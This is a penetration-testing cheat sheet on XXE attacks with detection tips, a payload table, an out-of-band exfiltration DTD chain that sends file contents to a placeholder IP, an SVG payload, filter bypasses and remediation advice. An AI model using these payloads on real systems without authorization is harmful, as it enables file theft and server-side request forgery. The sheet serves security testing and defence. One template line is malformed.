# XML External Entity (XXE)

> Abuse of XML parsers that resolve external entities to read files, perform SSRF, or trigger denial-of-service. Authorized testing only.

## TL;DR
- Two classes: **classic XXE** (parser reflects the entity in the response) and **blind XXE** (no direct reflection — use OOB DNS/HTTP).
- DOCTYPE block (`<!DOCTYPE foo [ … ]>`) declares entities the parser will expand if external entity resolution is enabled.
- Vectors: file read (`file://`), SSRF (`http://`), PHP-only source read (`php://filter`), error-based exfil (parameter entities).
- CWE-611 Improper Restriction of XML External Entity Reference; map: OWASP WSTG-INPV-07.

## Detection / Discovery
- Send a benign DOCTYPE; a parser that resolves entities will fetch your URL even if it doesn't render it back.
- Trigger via OOB to a controlled DNS / HTTP listener (e.g. Burp Collaborator, `interactsh`).

```xml
<!DOCTYPE foo [ <!ENTITY ping SYSTEM "http://<COLLABORATOR>/probe" > ]>
<foo>&ping;</foo>
```

## Exploitation

### Direct payloads
| Payload | Description |
| --- | --- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define external entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define external entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |

### Out-of-band file read (parameter-entity chain)

The original DTD template — host on a controlled HTTP server, then reference via `<!DOCTYPE>`:

```xml
<!DOCTYPE < [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///FILE.php">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://<LOCALHOST>:<PORT>/xxe.dtd">
%xxe;
]>
```

### XXE inside SVG
SVG is XML — file-upload features that accept `.svg` and render server-side are XXE-able:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]>
<svg width="400px" height="400px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## Bypasses
- Filter on `SYSTEM`: try `PUBLIC "-//W3C//DTD …" "http://attacker/x.dtd"`.
- UTF-7 / UTF-16 BOM tricks to defeat content-type sniffers that block `<?xml`.
- XInclude (`xi:include`) is a separate vector when XXE is disabled but XInclude is enabled.
- DOCTYPE-stripping libraries: try `<!--… --> <!DOCTYPE …>` after a comment, or chunked transfer to confuse the parser.

## Defence / Remediation
- **Disable external entity & DTD resolution** in every XML parser used by the app — language/library specifics differ but the option always exists. (OWASP XXE Prevention Cheat Sheet documents per-language config.)
- Strip / reject DOCTYPE on the way in (positive-model whitelist of XML schemas).
- Use JSON for new APIs; SVG uploads need explicit XXE-disabled SVG parser or server-side rasterization.
- Egress filter from the XML processor — even if XXE lands, blocked outbound to attacker reduces blind-XXE impact.

## Sources
- OWASP WSTG-INPV-07 XML Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- OWASP Cheat Sheet — XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- PayloadsAllTheThings XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- HackTricks XXE: https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
